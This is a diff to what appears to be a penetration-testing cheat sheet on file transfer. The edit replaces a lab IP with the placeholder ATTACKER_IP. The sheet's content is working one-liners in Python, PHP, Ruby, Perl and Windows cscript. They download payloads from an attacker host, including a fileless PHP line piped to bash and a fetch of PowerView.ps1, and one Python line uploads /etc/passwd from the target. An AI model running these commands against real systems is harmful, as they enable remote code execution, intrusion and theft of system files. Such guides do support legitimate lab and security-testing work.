@@ -23,16 +23,16 @@ No `wget`, `curl` or `certutil`, but the box has Python, PHP or similar (common 
 
 ```bash
 # Python (2 or 3)
-python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.5/f","f")'
-python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.14.5/f","f")'
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER_IP/f","f")'
+python2.7 -c 'import urllib;urllib.urlretrieve("http://ATTACKER_IP/f","f")'
 
 # PHP
-php -r '$f=file_get_contents("http://10.10.14.5/f");file_put_contents("f",$f);'
-php -r '$l=@file("http://10.10.14.5/x.sh");foreach($l as $n){echo $n;}' | bash   # fileless
+php -r '$f=file_get_contents("http://ATTACKER_IP/f");file_put_contents("f",$f);'
+php -r '$l=@file("http://ATTACKER_IP/x.sh");foreach($l as $n){echo $n;}' | bash   # fileless
 
 # Ruby and Perl
-ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI.parse("http://10.10.14.5/f")))'
-perl -e 'use LWP::Simple;getstore("http://10.10.14.5/f","f");'
+ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI.parse("http://ATTACKER_IP/f")))'
+perl -e 'use LWP::Simple;getstore("http://ATTACKER_IP/f","f");'
 ```
 
 ## Windows with JavaScript or VBScript
@@ -46,7 +46,7 @@ s.Write(r.ResponseBody);s.SaveToFile(WScript.Arguments(1));
 ```
 
 ```text
-C:\> cscript.exe /nologo wget.js http://10.10.14.5/PowerView.ps1 PowerView.ps1
+C:\> cscript.exe /nologo wget.js http://ATTACKER_IP/PowerView.ps1 PowerView.ps1
 ```
 
 ## Upload with Python
@@ -55,7 +55,7 @@ C:\> cscript.exe /nologo wget.js http://10.10.14.5/PowerView.ps1 PowerView.ps1
 # On your box: a server that accepts POST /upload
 python3 -m uploadserver
 # On the target: post a file
-python3 -c 'import requests;requests.post("http://10.10.14.5:8000/upload",files={"files":open("/etc/passwd","rb")})'
+python3 -c 'import requests;requests.post("http://ATTACKER_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 ## Notes
